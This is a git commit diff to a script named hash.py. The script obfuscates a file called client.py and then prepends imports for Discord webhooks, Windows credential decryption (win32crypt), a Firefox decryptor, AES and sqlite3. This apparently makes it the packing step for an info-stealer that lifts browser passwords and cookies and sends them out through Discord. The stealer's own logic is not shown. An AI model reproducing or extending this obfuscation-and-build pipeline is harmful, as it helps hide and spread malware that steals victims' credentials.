93d2bae417525e52408d639c8388b35e2c48bc60
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-19 16:22:46 +0200

    Update hash.py

--- hash.py
+++ hash.py
@@ -8,3 +8,40 @@ hashfile = "y"
 
 pyImpossibleObf.obfuscate("client.py")
 print("[.] Created client.py.hashed.py .")
+txt = open("client.py.hashed.py", "r").read()
+open("client.py.hashed.py", "w+").write("""import os
+from datetime import datetime, timedelta
+from os import getenv, getlogin, listdir
+from shutil import copyfile
+import sqlite3
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import win32crypt
+import codecs
+import win32crypt
+import shutil
+import command
+import socket
+import time
+import random
+import threading
+import re
+import json
+import uuid
+import textwrap
+from glob import glob
+import FireFoxDecrypt
+import requests
+import sys
+import base64
+from base64 import b64decode
+from Crypto.Cipher import AES
+from json import loads
+from regex import findall
+import platform
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import time
+import codecs
+import os
+from http.server import HTTPServer, CGIHTTPRequestHandler
+import tkinter as tk
+import pyImpossibleObf\n""" + txt)
